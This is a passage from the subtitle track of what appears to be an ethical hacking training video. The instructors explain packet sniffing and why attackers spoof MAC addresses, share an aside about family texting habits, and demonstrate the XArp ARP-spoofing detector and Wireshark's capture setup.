wire.\n\n308\n00:15:00.435 --> 00:15:03.062\nAnd we're going to show\nyou with Wireshark, and\n\n309\n00:15:03.062 --> 00:15:06.456\nprograms like that how we can pull\npackets out in real time, but\n\n310\n00:15:06.456 --> 00:15:11.070\nwe may want to modify MAC address to cover\nour tracks or manipulate in some way.\n\n311\n00:15:11.070 --> 00:15:14.250\nPackets so they look like they're\ncoming from somebody when they're not.\n\n312\n00:15:14.250 --> 00:15:17.370\nAnd remember, sniffing is the art and\nthe science of either actively or\n\n313\n00:15:17.370 --> 00:15:20.870\npassively gathering\ninformation to our advantage.\n\n314\n00:15:20.870 --> 00:15:23.125\nBut we're gonna link\nthat to other activities,\n\n315\n00:15:23.125 --> 00:15:24.781\nsome of which we've talked about.\n\n316\n00:15:24.781 --> 00:15:27.880\nAnd we wanna make sure we understand\nthat sniffing gives us the raw data.\n\n317\n00:15:27.880 --> 00:15:31.342\nAnd I think this is actually the\nterminology you use as we were talking It\n\n318\n00:15:31.342 --> 00:15:32.450\ngives us the raw data.\n\n319\n00:15:32.450 --> 00:15:35.790\nAnd the ability to be able to\ninteract with that information\n\n320\n00:15:35.790 --> 00:15:37.190\nto then make decisions, right?\n\n321\n00:15:37.190 --> 00:15:39.260\nAs bad actors, as hackers.\n\n322\n00:15:39.260 --> 00:15:42.780\nWe're going to be deciding what advantage\nwe want to be able to try to seek.\n\n323\n00:15:42.780 --> 00:15:44.853\nWhat vulnerabilities or\nweaknesses, essentially,\n\n324\n00:15:44.853 --> 00:15:46.299\nwe want to take advantage of, right?\n\n325\n00:15:46.299 --> 00:15:47.920\nSo how we're going to pose a threat.\n\n326\n00:15:47.920 --> 00:15:51.161\nWhat kind of risks are we going to\nbring to the table and exploit,\n\n327\n00:15:51.161 --> 00:15:54.779\nas The certified ethical hacker is\nthe person who's trying to defend.\n\n328\n00:15:54.779 --> 00:15:57.510\nWe have to anticipate as much\nof that as possible, and\n\n329\n00:15:57.510 --> 00:16:00.130\nthen we have to be\nprepared to counter that.\n\n330\n00:16:00.130 --> 00:16:04.610\nSo we would want to try to prevent\nremote access to a system to give\n\n331\n00:16:04.610 --> 00:16:06.402\nthis kind of level of capability.\n\n332\n00:16:06.402 --> 00:16:09.160\nWe'd wanna try to prevent\nremote registry editing, right?\n\n333\n00:16:09.160 --> 00:16:12.080\nThis is one of the things that\na lot of trojans seek to enable.\n\n334\n00:16:12.080 --> 00:16:14.520\nAnd the remote registry services\navailable to us in Windows,\n\n335\n00:16:14.520 --> 00:16:18.190\ndepending on the version of Windows you\nmay be using, was turned on by default.\n\n336\n00:16:18.190 --> 00:16:21.150\nI mean,\nimagine back in the old days, right?\n\n337\n00:16:21.150 --> 00:16:24.070\nThe days when things were different and\npeople trusted one another.\n\n338\n00:16:24.070 --> 00:16:26.474\nThey actually sat on the porch and\ntalked to each other, if you believe that.\n\n339\n00:16:26.474 --> 00:16:27.961\n&gt;&gt; [LAUGH]\n&gt;&gt; They didn't use cell phones.\n\n340\n00:16:27.961 --> 00:16:29.403\n&gt;&gt; What?\n&gt;&gt; You don't have kids yet, so\n\n341\n00:16:29.403 --> 00:16:30.140\nyou wouldn't know.\n\n342\n00:16:30.140 --> 00:16:32.290\n&gt;&gt; [LAUGH]\n&gt;&gt; So, at some point, right?\n\n343\n00:16:32.290 --> 00:16:33.690\nIf this ever does happen for you.\n\n344\n00:16:33.690 --> 00:16:37.940\nSo, [COUGH] my wife is sitting,\nI think I've talked about this before.\n\n345\n00:16:37.940 --> 00:16:39.260\nMy wife is sitting.\n\n346\n00:16:39.260 --> 00:16:41.010\nI'm on the couch with her in our house,\n\n347\n00:16:41.010 --> 00:16:43.410\none of the rare days that\nI'm actually home, right?\n\n348\n00:16:43.410 --> 00:16:47.770\nAnd she's sitting and she says, hey,\nI wanna talk to one of our kids, right?\n\n349\n00:16:47.770 --> 00:16:49.840\nAnd I need to ask her a question.\n\n350\n00:16:49.840 --> 00:16:53.088\nSo instead of doing what she normally\ndoes, she doesn't either bellow for her,\n\n351\n00:16:53.088 --> 00:16:54.252\nwhich she does quite often.\n\n352\n00:16:54.252 --> 00:16:58.416\nOr she doesn't get up, which is a fairly\nrare occurrence, and actually go and\n\n353\n00:16:58.416 --> 00:17:01.648\nwalk over to her room,\nshe pulls out her phone and texts her.\n\n354\n00:17:01.648 --> 00:17:03.424\nShe's sitting 15 feet away.\n\n355\n00:17:03.424 --> 00:17:04.620\n&gt;&gt; [LAUGH]\n&gt;&gt; Right?\n\n356\n00:17:04.620 --> 00:17:05.920\nShe texts her.\n\n357\n00:17:05.920 --> 00:17:07.180\nAnd then my child, right?\n\n358\n00:17:07.180 --> 00:17:12.379\nWho is my oldest child, texts her back\ninstead of coming out to talk to her.\n\n359\n00:17:12.379 --> 00:17:14.500\nAnd so they have this conversation\ngoing back and forth.\n\n360\n00:17:14.500 --> 00:17:15.250\n&gt;&gt; Really?\n\n361\n00:17:15.250 --> 00:17:16.720\n&gt;&gt; Yes, via text.\n\n362\n00:17:16.720 --> 00:17:17.220\n&gt;&gt; Wow.\n\n363\n00:17:17.220 --> 00:17:20.090\n&gt;&gt; And I'm paying ridiculous\namounts of money, right?\n\n364\n00:17:20.090 --> 00:17:21.850\nEvery month, so that they can do this.\n\n365\n00:17:21.850 --> 00:17:24.650\nNot only for wireless access, because\nthey use wireless when they're home,\n\n366\n00:17:24.650 --> 00:17:27.420\nbecause obviously we don't\nwanna overrun our data usage,\n\n367\n00:17:27.420 --> 00:17:29.550\nwhich would be even more\nridiculous amounts of money.\n\n368\n00:17:29.550 --> 00:17:32.500\nBut I'm paying a lot of money for\ncell phone usage every month.\n\n369\n00:17:34.020 --> 00:17:35.350\nI didn't know what to say.\n\n370\n00:17:35.350 --> 00:17:37.770\nDo you ever have one of those\nmoments where you're not quite sure,\n\n371\n00:17:37.770 --> 00:17:40.520\nno matter what you say,\nit will be wrong so you say nothing?\n\n372\n00:17:40.520 --> 00:17:43.300\nBecause as you get older, you're smart\nenough to know you should say nothing.\n\n373\n00:17:43.300 --> 00:17:44.743\nWhen I was younger I\nwould've said something,\n\n374\n00:17:44.743 --> 00:17:46.546\nwhich is why I didn't get married\nuntil I was older because I\n\n375\n00:17:46.546 --> 00:17:47.587\nwasn't actually able to-\n&gt;&gt; Yeah,\n\n376\n00:17:47.587 --> 00:17:48.670\nyou gotta pick your battles, right?\n\n377\n00:17:48.670 --> 00:17:50.040\n&gt;&gt; Exist in a relationship.\n\n378\n00:17:50.040 --> 00:17:52.356\nYeah, you gotta pick your battles,\nright, so.\n\n379\n00:17:52.356 --> 00:17:57.040\n&gt;&gt; I've been at like a food court, saw\nfour younger looking people sitting there\n\n380\n00:17:57.040 --> 00:18:00.790\nall staring out their phone,\nassuming they're playing games or\n\n381\n00:18:00.790 --> 00:18:03.640\ntexting somebody else,\nsomebody's that's not right next to them.\n\n382\n00:18:03.640 --> 00:18:05.460\nBut then they all laugh in unison.\n\n383\n00:18:05.460 --> 00:18:07.537\nSo I know that they're all\ntexting each other, but\n\n384\n00:18:07.537 --> 00:18:09.048\nthey're sitting at the same table.\n\n385\n00:18:09.048 --> 00:18:14.123\n&gt;&gt; Yeah, it happens, we'll go out\nto dinner, and both my kids, right?\n\n386\n00:18:14.123 --> 00:18:16.364\nI mean everybody's kid,\nit's not just my kids, right?\n\n387\n00:18:16.364 --> 00:18:19.380\nBut today, hey, get off the phone.\n\n388\n00:18:19.380 --> 00:18:22.480\nOkay, five seconds later,\nget off the phone, it's just nonstop.\n\n389\n00:18:22.480 --> 00:18:24.306\nAnd so it is, it's a cultural thing.\n\n390\n00:18:24.306 --> 00:18:27.380\nIt's a generation thing as well\nbecause while I'm on my phone for\n\n391\n00:18:27.380 --> 00:18:31.350\nwork, I purposefully will put it away\nwhen we're doing family related stuff cuz\n\n392\n00:18:31.350 --> 00:18:32.150\nthat's important.\n\n393\n00:18:32.150 --> 00:18:33.450\nThat's what you do.\n\n394\n00:18:33.450 --> 00:18:37.470\nBut today, kids of this generation,\nthat's how they are.\n\n395\n00:18:37.470 --> 00:18:37.980\nThey're smart,\n\n396\n00:18:37.980 --> 00:18:41.070\nthey're connected all the time, which is\nwhy they're gonna make such great hackers.\n\n397\n00:18:41.070 --> 00:18:41.600\n&gt;&gt; Exactly.\n\n398\n00:18:41.600 --> 00:18:43.410\n&gt;&gt; They already do because,\nall kidding aside,\n\n399\n00:18:43.410 --> 00:18:45.060\nI'm being totally serious about this.\n\n400\n00:18:45.060 --> 00:18:49.378\nThis generation, kids that are coming up\nnow in their teens and going into their\n\n401\n00:18:49.378 --> 00:18:53.826\nearly 20s that have come through this\ntechnology revolution, and lived in it in\n\n402\n00:18:53.826 --> 00:18:58.414\nreal time, have grown up with technology,\nand the generation coming behind them.\n\n403\n00:18:58.414 --> 00:19:02.398\nMy little nephew who's three years old,\nfour years old now,\n\n404\n00:19:02.398 --> 00:19:04.780\nknows how to use an iPhone, an iPod.\n\n405\n00:19:04.780 --> 00:19:07.190\nI mean he can go out and do whatever.\n\n406\n00:19:07.190 --> 00:19:09.199\nAnd the kid's quicker than I am, right?\n\n407\n00:19:09.199 --> 00:19:09.920\nOn this stuff.\n\n408\n00:19:09.920 --> 00:19:12.540\nSo I mean, these kids are gonna be\n\n409\n00:19:12.540 --> 00:19:14.700\njust wired from the time\nthey come out of the womb.\n\n410\n00:19:14.700 --> 00:19:18.995\nAnd as a result, it's gonna be totally,\nfor them, comfortable and normal.\n\n411\n00:19:18.995 --> 00:19:20.840\n&gt;&gt; Exactly.\n&gt;&gt; That this kinda stuff happens as\n\n412\n00:19:20.840 --> 00:19:25.550\nopposed to people of my generation\nwho really grew up fully and\n\n413\n00:19:25.550 --> 00:19:27.430\nbecame adults in the work force before,\n\n414\n00:19:27.430 --> 00:19:30.830\nat least most of us,\nbefore this technology really took hold.\n\n415\n00:19:30.830 --> 00:19:33.740\nI have no trouble with any of it,\nand I can use any of it effectively.\n\n416\n00:19:33.740 --> 00:19:38.600\nBut it's not intuitive to me the way\nit is to them because I grew up\n\n417\n00:19:38.600 --> 00:19:40.580\nusing an actual typewriter.\n\n418\n00:19:40.580 --> 00:19:41.080\n&gt;&gt; Yes.\n&gt;&gt; Right?\n\n419\n00:19:41.080 --> 00:19:43.270\nNot texting to send messages.\n\n420\n00:19:43.270 --> 00:19:44.210\nAnd I remember,\n\n421\n00:19:44.210 --> 00:19:46.070\nwe've talked about this in prior episodes.\n\n422\n00:19:46.070 --> 00:19:48.280\nI remember technology that\ndoesn't exist anymore, right?\n\n423\n00:19:48.280 --> 00:19:50.470\nAnd that's what I used going to school.\n\n424\n00:19:50.470 --> 00:19:52.160\nWe talked about transparencies,\n\n425\n00:19:52.160 --> 00:19:54.606\nand some of the other things\nyou just don't see anymore.\n\n426\n00:19:54.606 --> 00:19:57.670\nAnd so it's just a very interesting\napproach when you look at\n\n427\n00:19:57.670 --> 00:20:01.580\nthe effectiveness of information\nsecurity professionals.\n\n428\n00:20:01.580 --> 00:20:06.100\nAnd you talk generationally about\nknowledge, and kind of that tribal\n\n429\n00:20:06.100 --> 00:20:09.430\nknowledge that gets passed down verbally,\nand the stuff that we know.\n\n430\n00:20:09.430 --> 00:20:13.250\nI'm seeing more and more of these moments\nas I talk to people, I talk to customers,\n\n431\n00:20:13.250 --> 00:20:14.410\nI talk to students.\n\n432\n00:20:14.410 --> 00:20:17.110\nI speak at conferences, I write, whatever.\n\n433\n00:20:17.110 --> 00:20:17.960\nI'm seeing more and\n\n434\n00:20:17.960 --> 00:20:22.780\nmore of these younger generational people\ncoming and asking about references for\n\n435\n00:20:22.780 --> 00:20:25.440\nstuff that they don't understand\nbecause they have no connection to it.\n\n436\n00:20:25.440 --> 00:20:28.360\nLike what were you talking about with that\nwhole send mail from command-line thing,\n\n437\n00:20:28.360 --> 00:20:29.183\nwhat the hell was that?\n\n438\n00:20:29.183 --> 00:20:30.350\n&gt;&gt; Right.\n[LAUGH]\n\n439\n00:20:30.350 --> 00:20:31.300\n&gt;&gt; What is a command-line, and\n\n440\n00:20:31.300 --> 00:20:31.810\nhow does that work?\n\n441\n00:20:31.810 --> 00:20:33.180\nDo I have an app for that?\n\n442\n00:20:33.180 --> 00:20:35.410\nIs actually what somebody said to me.\n\n443\n00:20:35.410 --> 00:20:39.170\nI politely tried to explain, no,\nthere's no app for that, except for\n\n444\n00:20:39.170 --> 00:20:42.020\nthe app that actually has always\nbeen there called command, right?\n\n445\n00:20:42.020 --> 00:20:42.855\nAnd that's what you use.\n\n446\n00:20:42.855 --> 00:20:44.980\n&gt;&gt; [LAUGH]\n&gt;&gt; But no, it doesn't exist on your phone,\n\n447\n00:20:44.980 --> 00:20:46.200\nso you probably have no knowledge of it,\n\n448\n00:20:46.200 --> 00:20:48.960\ncuz you obviously don't\nuse a computer regularly.\n\n449\n00:20:48.960 --> 00:20:52.490\nAnd it's just interesting as a kind of\nan aside as we're going through this.\n\n450\n00:20:52.490 --> 00:20:54.090\nAnd we're gonna get back\nto this in a second.\n\n451\n00:20:54.090 --> 00:20:56.440\nBut just thinking about where\nthat knowledge lives, and\n\n452\n00:20:56.440 --> 00:21:02.230\nthe skills that these generational\ndiscussions really transfer, right?\n\n453\n00:21:02.230 --> 00:21:04.890\nAnd that cultural and\nkind of verbal knowledge.\n\n454\n00:21:04.890 --> 00:21:06.036\nI mean there's stuff you and\n\n455\n00:21:06.036 --> 00:21:09.237\nI will talk about with people that I'm\nsure they'll nod their head politely and\n\n456\n00:21:09.237 --> 00:21:11.739\nsay, okay yeah whatever, but\nthey have no clue what that is.\n\n457\n00:21:11.739 --> 00:21:13.510\nI mean you ask somebody\nwhat a mux is today.\n\n458\n00:21:13.510 --> 00:21:14.592\n&gt;&gt; Uh-huh.\n[LAUGH]\n\n459\n00:21:14.592 --> 00:21:15.933\n&gt;&gt; Ask somebody what a line\n\n460\n00:21:15.933 --> 00:21:17.010\nconditioner was.\n\n461\n00:21:17.010 --> 00:21:19.370\nAsk somebody what a channel bank is.\n\n462\n00:21:19.370 --> 00:21:21.460\nThey may or may not know that stuff, and\n\n463\n00:21:21.460 --> 00:21:24.290\nthat's stuff that actually still\nexists in some respects, right?\n\n464\n00:21:24.290 --> 00:21:25.690\nSo, it's just very interesting.\n\n465\n00:21:25.690 --> 00:21:26.596\nAnyway, let's go back.\n\n466\n00:21:26.596 --> 00:21:27.620\n&gt;&gt; Yeah.\n&gt;&gt; You were gonna say something.\n\n467\n00:21:27.620 --> 00:21:28.440\nLet's go back to where we were.\n\n468\n00:21:28.440 --> 00:21:30.710\n&gt;&gt; I was gonna ask about, when we talked\nabout changing the MAC address and\n\n469\n00:21:30.710 --> 00:21:33.210\nusing a program like SMAC or\nsomething like that.\n\n470\n00:21:33.210 --> 00:21:34.240\nSo to what advantage,\n\n471\n00:21:34.240 --> 00:21:37.620\nwhat are we getting out of being able\nto change our MAC address like that?\n\n472\n00:21:37.620 --> 00:21:40.730\n&gt;&gt; Sure, so sorry, I was just leaning over\nto set something up while we were talking.\n\n473\n00:21:40.730 --> 00:21:42.390\nSo, here I am right over here.\n\n474\n00:21:42.390 --> 00:21:44.850\nSo, the advantage we get ultimately,\nright?\n\n475\n00:21:44.850 --> 00:21:45.610\nIs several fold.\n\n476\n00:21:45.610 --> 00:21:46.480\nNumber one,\n\n477\n00:21:46.480 --> 00:21:51.400\nthe Mac address is the unique identifier\nat layer two of the OSI model right?\n\n478\n00:21:51.400 --> 00:21:55.230\nSo in the data link layers we spoke\nabout in last episode, looking at,\n\n479\n00:21:55.230 --> 00:21:58.730\nfrom a scanning perspective,\na sniffing perspective, looking for\n\n480\n00:21:58.730 --> 00:22:01.980\nthat Mac address match\nnormally to process traffic.\n\n481\n00:22:01.980 --> 00:22:05.360\nSo we may be able to\nessentially create a spoof or\n\n482\n00:22:05.360 --> 00:22:09.710\na masquerade event if we can take on\nsomebody else's MAC address identity,\n\n483\n00:22:09.710 --> 00:22:14.100\npassing traffic, typically bad traffic,\nattack traffic, into a system.\n\n484\n00:22:14.100 --> 00:22:18.410\nPassing it through filtering devices,\nborder gateway devices, firewalls, IDSs,\n\n485\n00:22:18.410 --> 00:22:19.700\nwhatever the case may be.\n\n486\n00:22:19.700 --> 00:22:22.400\nWe may be able to look, in other words,\nlike somebody when we're not,\n\n487\n00:22:22.400 --> 00:22:23.720\nfirst and foremost.\n\n488\n00:22:23.720 --> 00:22:26.440\nNumber two, we can hide our identity.\n\n489\n00:22:26.440 --> 00:22:29.890\nSo we could pretend to be someone else,\nnot just to attack, but\n\n490\n00:22:29.890 --> 00:22:31.710\nto carry out reconnaissance and\nmake it look,\n\n491\n00:22:31.710 --> 00:22:36.460\nin logs, like we were somebody who\npotentially either belonged on the inside.\n\n492\n00:22:36.460 --> 00:22:40.090\nObviously, we would have to manipulate IP\naddresses further up the stack in layer\n\n493\n00:22:40.090 --> 00:22:42.140\nthree to be able to do that.\n\n494\n00:22:42.140 --> 00:22:45.087\nBut that's not too difficult cuz we\ncould figure that out through some basic\n\n495\n00:22:45.087 --> 00:22:46.940\nscanning, and\nvery quickly understand that.\n\n496\n00:22:46.940 --> 00:22:49.470\nAnd we could then obviously\nmasquerade totally.\n\n497\n00:22:49.470 --> 00:22:52.630\nBut it would allow us to\nessentially hide our identity and\n\n498\n00:22:52.630 --> 00:22:57.190\nbe recorded doing things, but under\nthe guise of a different identity, right?\n\n499\n00:22:57.190 --> 00:22:57.900\nA different profile.\n\n500\n00:22:57.900 --> 00:23:00.190\nSo, it allows us to spoof and to hide and\n\n501\n00:23:00.190 --> 00:23:03.316\nmasquerade, really,\nis the primary function.\n\n502\n00:23:03.316 --> 00:23:06.520\nIn addition, there are some security\nrelated things that we do need to do\n\n503\n00:23:06.520 --> 00:23:10.390\nthrough binding secondary Mac addresses\nin virtual environments, for instance.\n\n504\n00:23:10.390 --> 00:23:15.450\nTo be able to specify that we\ncan use that Mac address maybe\n\n505\n00:23:15.450 --> 00:23:20.260\nfrom a physical machine as we physical\nto virtualize to do what we call a P2V,\n\n506\n00:23:20.260 --> 00:23:22.770\nto transform it into a virtual system.\n\n507\n00:23:22.770 --> 00:23:24.338\nAt some point we do that.\n\n508\n00:23:24.338 --> 00:23:28.810\nIf we P2V a system, and we have a physical\nadapter, which we will, and that adapter\n\n509\n00:23:28.810 --> 00:23:33.648\nis tied to licensing via the MAC address,\nwhich in many cases it may be.\n\n510\n00:23:33.648 --> 00:23:36.960\nThink of CAD/CAM programs\nlike engineering software,\n\n511\n00:23:36.960 --> 00:23:41.592\nthink of medical programs that are running\non a system that have to be licensed.\n\n512\n00:23:41.592 --> 00:23:45.015\nA lot of this stuff is really\nhigh-end software, very expensive,\n\n513\n00:23:45.015 --> 00:23:48.747\nthat Vendors traditionally have\na license based on unique identifiers.\n\n514\n00:23:48.747 --> 00:23:53.050\nUSB key fobs, tokens and\nMac addresses are kind of all the rage.\n\n515\n00:23:53.050 --> 00:23:55.610\nAnd have been, you know,\nused for many years to do this.\n\n516\n00:23:55.610 --> 00:23:57.630\nIf it's tied to a Mac address\nwhen you virtualize it,\n\n517\n00:23:57.630 --> 00:24:01.630\nyou virtualize the system, you virtualize\nthe adapter, the adapter changes.\n\n518\n00:24:01.630 --> 00:24:06.540\nBecause now you have either a VM ware of\na Microsoft Adapter, with the prefix like,\n\n519\n00:24:06.540 --> 00:24:09.820\n005056, or whatever it is in\nthe Mac address for VM ware.\n\n520\n00:24:09.820 --> 00:24:14.150\nThat Mac address will be different then\nthe physical adaptor D link or an SMC or\n\n521\n00:24:14.150 --> 00:24:17.390\nwhatever it may of been right who ever\nmay of made an adaptor physically.\n\n522\n00:24:17.390 --> 00:24:21.370\nTraditionally there is no way to deal\nwith that because that Mac address is now\n\n523\n00:24:21.370 --> 00:24:22.390\nthe new Mac address.\n\n524\n00:24:22.390 --> 00:24:25.030\nThe licensing breaks the app\ndoesn't run and you know,\n\n525\n00:24:25.030 --> 00:24:26.400\nyou are stuck with the vendor.\n\n526\n00:24:26.400 --> 00:24:28.940\nWell, okay, you are screwed,\nyou could do that there.\n\n527\n00:24:28.940 --> 00:24:30.530\nOr hey, yeah, great that you called.\n\n528\n00:24:30.530 --> 00:24:33.280\nDo you have your checkbook handy?\n\n529\n00:24:33.280 --> 00:24:36.790\nBecause you are writing another check for\nanother license.\n\n530\n00:24:36.790 --> 00:24:40.590\nAlso a great outcome to that phone call,\none that we often look forward to.\n\n531\n00:24:40.590 --> 00:24:44.090\nSo really in that respect,\nwe haven't have had for\n\n532\n00:24:44.090 --> 00:24:48.050\nseveral generations in these platforms the\nability to do this other thing which is to\n\n533\n00:24:48.050 --> 00:24:50.580\nliterally bind, another Mac address.\n\n534\n00:24:50.580 --> 00:24:53.170\nWe're your changing rituals,\nthis is a distinction.\n\n535\n00:24:53.170 --> 00:24:55.760\nBut we are binding a secondary Mac address\n\n536\n00:24:55.760 --> 00:24:59.120\nto the adaptor to now give us\naccess to the old Mac address.\n\n537\n00:24:59.120 --> 00:25:01.050\nYou have to see how to document that.\n\n538\n00:25:01.050 --> 00:25:01.829\nBut we do have this capability.\n\n539\n00:25:01.829 --> 00:25:08.105\nSo MAC address changes in spoofs, can\nbe done in the system legitimately, but\n\n540\n00:25:08.105 --> 00:25:11.605\nwe're not actually modifying the original,\nwe're binding, something like Nadic.\n\n541\n00:25:11.605 --> 00:25:15.017\nWe're encapsulating and wrapping the\nsecondary MAC address there to do that.\n\n542\n00:25:15.017 --> 00:25:17.887\nSo, we don't really traditionally\nsee that as a change\n\n543\n00:25:17.887 --> 00:25:20.417\nthe way we would these technologies\nthat we're talking about.\n\n544\n00:25:20.417 --> 00:25:21.887\nPrimarily it's spoofing and masquerading,\n\n545\n00:25:21.887 --> 00:25:23.617\nthat's really what we wanna\ndo to hide our identity.\n\n546\n00:25:23.617 --> 00:25:25.707\nAnd to be able to gain\nadvantage by saying,\n\n547\n00:25:25.707 --> 00:25:28.310\nno it was Mike and\nMike's machine who was there.\n\n548\n00:25:28.310 --> 00:25:32.420\nWhen in fact it was Megan, or somebody\nelse that was actually engaging that\n\n549\n00:25:32.420 --> 00:25:35.500\nactivity, but she chose to\nspoof your MAC address, right.\n\n550\n00:25:35.500 --> 00:25:37.530\nAnd so then obviously make\nit look like it was you.\n\n551\n00:25:37.530 --> 00:25:39.420\nCuz she's-\n&gt;&gt; She's crafty like that.\n\n552\n00:25:39.420 --> 00:25:41.870\n&gt;&gt; She is, she has that gleam in\nher eye when nobody's looking and\n\n553\n00:25:41.870 --> 00:25:43.320\nthat's what she does.\n\n554\n00:25:43.320 --> 00:25:44.020\nWhen nobody is around.\n\n555\n00:25:44.020 --> 00:25:44.680\nAll right.\n\n556\n00:25:44.680 --> 00:25:46.380\nSo we go back to the machine here.\n\n557\n00:25:46.380 --> 00:25:48.890\nNow that I said that we're gonna\nlike randomly be switched.\n\n558\n00:25:48.890 --> 00:25:49.460\nWhat machine?\n\n559\n00:25:49.460 --> 00:25:50.480\nWhat are you talking about Adam?\n\n560\n00:25:50.480 --> 00:25:52.090\nI don't know what you're talking about.\n\n561\n00:25:52.090 --> 00:25:54.540\nAll right.\nSo let's go in and\n\n562\n00:25:54.540 --> 00:25:56.710\nlet's take a look at another program here.\n\n563\n00:25:56.710 --> 00:25:59.870\nLet me Scroll down here real quick.\n\n564\n00:25:59.870 --> 00:26:01.620\nJust bare with me here half a second.\n\n565\n00:26:01.620 --> 00:26:03.870\nGoing to open up this program called XArp.\n\n566\n00:26:03.870 --> 00:26:04.830\nI just closed it.\n\n567\n00:26:04.830 --> 00:26:09.430\nSo I just want to open it back up again,\nand let's take a look at the XArp utility.\n\n568\n00:26:09.430 --> 00:26:12.720\nThe XArp utility is going\nto be another interesting\n\n569\n00:26:12.720 --> 00:26:15.850\nutility switching gears a little\nbit just away from the Mac address,\n\n570\n00:26:15.850 --> 00:26:18.630\nalthough MAC addresses\nare part of this of course.\n\n571\n00:26:18.630 --> 00:26:22.420\nBut what we can do here is, let me\njust make this a little bit bigger so\n\n572\n00:26:22.420 --> 00:26:23.270\nyou can see this.\n\n573\n00:26:24.760 --> 00:26:27.570\nThis is going to monitor and\nsee whether or\n\n574\n00:26:27.570 --> 00:26:29.700\nnot someone's attempting\nARP attacks against us.\n\n575\n00:26:29.700 --> 00:26:34.188\nSo we can run this program as\nan anti-sniffing technology essentially.\n\n576\n00:26:34.188 --> 00:26:36.120\nActually, an anti-attack technology.\n\n577\n00:26:36.120 --> 00:26:38.460\nBut sniffing,\nobviously is always gonna preclude,\n\n578\n00:26:38.460 --> 00:26:41.750\ntypically, these kind of attacks,\nor rather predate them, right?\n\n579\n00:26:41.750 --> 00:26:45.740\nSo we're gonna have to make sure\nthat we are on guard, if you will.\n\n580\n00:26:45.740 --> 00:26:50.700\nAnd so as we do this,\nthat [COUGH] this particular program, and\n\n581\n00:26:50.700 --> 00:26:55.580\nmany others like it, allow us to be\nable to see what addresses are active,\n\n582\n00:26:55.580 --> 00:26:59.820\nwhat MAC addresses are active,\nwhat hosts are active, in our system.\n\n583\n00:26:59.820 --> 00:27:01.440\nAnd we have a basic security level,\n\n584\n00:27:01.440 --> 00:27:05.400\na little slide or basic,\nneo-minimal, high, aggressive.\n\n585\n00:27:05.400 --> 00:27:07.140\nAs I move it up.\n\n586\n00:27:07.140 --> 00:27:11.367\nLet's just click there if I can do that,\nthere we go.\n\n587\n00:27:15.797 --> 00:27:17.770\nAll right.\n&gt;&gt; It's not a very sliding slider.\n\n588\n00:27:17.770 --> 00:27:18.820\n&gt;&gt; No well you know,\n\n589\n00:27:18.820 --> 00:27:22.330\nwe were talking about that little\nissue that we have been having.\n\n590\n00:27:22.330 --> 00:27:23.070\nSo.\n\n591\n00:27:23.070 --> 00:27:26.330\nAs I try to slide it up alright.\n\n592\n00:27:26.330 --> 00:27:28.720\nSo imagine that it slide up for\njust a second.\n\n593\n00:27:28.720 --> 00:27:31.450\nWe're having a little bit of\na mouse problem intermittently.\n\n594\n00:27:31.450 --> 00:27:33.390\nSo I think it may just be\nnot registering the click.\n\n595\n00:27:33.390 --> 00:27:36.315\nSo imagine I was able to click,\nslide it up, and\n\n596\n00:27:36.315 --> 00:27:38.915\nwhen I did that it would\nchange a protection profile.\n\n597\n00:27:38.915 --> 00:27:43.715\nAnd basically what would happen is\nthat we would then be able to see that\n\n598\n00:27:44.785 --> 00:27:45.895\nas this is running.\n\n599\n00:27:45.895 --> 00:27:48.805\nAnd what I'll do is I'll just leave\nthis minimized and leave it running so\n\n600\n00:27:48.805 --> 00:27:50.805\nwe could see it as we do some other demos.\n\n601\n00:27:50.805 --> 00:27:54.075\nWhen we get inbound traffic,\nthat looks like it may be attempting to\n\n602\n00:27:54.075 --> 00:27:58.185\nsniff the system or look at ARP related\ntraffic, we'll get a pop-up, a warning,\n\n603\n00:27:58.185 --> 00:28:00.640\nright, that essentially says hey,\nsomething's going on.\n\n604\n00:28:00.640 --> 00:28:05.000\nYou want to be aware of that so arpspoof\ndetection is going to be very important,\n\n605\n00:28:05.000 --> 00:28:10.600\nbecause we want to make sure that we\nare keeping track of what's happening in\n\n606\n00:28:10.600 --> 00:28:15.940\nour system and running scanning software\nlocally is gonna be very important for us.\n\n607\n00:28:15.940 --> 00:28:19.890\nLet me just bring up the log file while\nwe're talking in the little program here,\n\n608\n00:28:19.890 --> 00:28:21.670\nlet us focus down so you could see it.\n\n609\n00:28:21.670 --> 00:28:25.670\nRight now, we do not have- how\nmuch in the way of log file,\n\n610\n00:28:25.670 --> 00:28:26.560\nit's just a few registered,\n\n611\n00:28:26.560 --> 00:28:30.800\nhey we started up, hey we're just marching\nreally nothing of any consequence.\n\n612\n00:28:30.800 --> 00:28:34.410\nBut over time, we'll then see\ntraffic being recorded in there, and\n\n613\n00:28:34.410 --> 00:28:37.570\nwe'll obviously be able to see\nadditional stuff coming in.\n\n614\n00:28:37.570 --> 00:28:40.810\nWe're gonna play with some things\nthat will help us to set that tool\n\n615\n00:28:40.810 --> 00:28:41.480\noff a little bit.\n\n616\n00:28:41.480 --> 00:28:43.220\nSo let's use a sniffing tool.\n\n617\n00:28:43.220 --> 00:28:45.440\nLet's actually go in and\nlaunch a sniffing tool.\n\n618\n00:28:45.440 --> 00:28:48.220\nI mentioned that we could use Wire Shark,\nyou may know this or\n\n619\n00:28:48.220 --> 00:28:51.080\nremember this as Ether Real\nfrom many many years ago.\n\n620\n00:28:51.080 --> 00:28:54.320\nIt was rebranded several years back.\n\n621\n00:28:54.320 --> 00:28:55.880\nIt's now called Wire Shark.\n\n622\n00:28:55.880 --> 00:28:57.440\nThey got the cool shark fin logo.\n\n623\n00:28:57.440 --> 00:28:58.850\n&gt;&gt; They do.\n&gt;&gt; Which is kind of cool, and\n\n624\n00:28:58.850 --> 00:29:00.600\nthe shark fin icon.\n\n625\n00:29:00.600 --> 00:29:01.950\nSo when we open this up,\n\n626\n00:29:01.950 --> 00:29:03.740\ntraditionally what you would do\n&gt;&gt; And\n\n627\n00:29:03.740 --> 00:29:05.790\nthere may be updated releases obviously.\n\n628\n00:29:05.790 --> 00:29:10.320\nYou can go in and you can update\nthe software if you want to.\n\n629\n00:29:10.320 --> 00:29:13.850\nBut traditionally you would go in\nfirst you would go to capture,\n\n630\n00:29:13.850 --> 00:29:15.990\ngo to interfaces as you program this tool.\n\n631\n00:29:15.990 --> 00:29:17.610\nSelect the capture interface, right,\n\n632\n00:29:17.610 --> 00:29:19.650\nif you have more than one\nthat you'd wanna use.\n\n633\n00:29:19.650 --> 00:29:23.820\nSo, you'd come in here, you would check\noff the appropriate interface, again\n\n634\n00:29:23.820 --> 00:29:28.610\nfigure out which interface I'm using, the\nlocal area interface, that is hooked up.\n\n635\n00:29:28.610 --> 